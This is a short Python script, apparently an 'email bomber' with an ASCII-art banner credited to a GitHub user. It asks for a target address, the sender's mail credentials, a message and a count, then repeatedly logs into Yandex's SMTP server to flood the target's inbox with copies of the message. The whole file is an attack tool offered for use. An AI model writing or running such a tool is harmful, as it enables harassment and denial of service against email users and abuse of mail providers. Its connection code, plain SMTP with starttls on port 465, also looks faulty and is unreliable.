import smtplib
import time

print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|         By @rasimtopcuu on Github          \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|                                            \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

try:
    bomb_email = input("Hedef sistem: ")
    email = input("Your Mail Address:")
    password = input("Your Password:")
    message = input("Message:")
    counter = int(input("Number of messages to be sent:"))

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail = smtplib.SMTP('smtp.yandex.com.tr',465)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")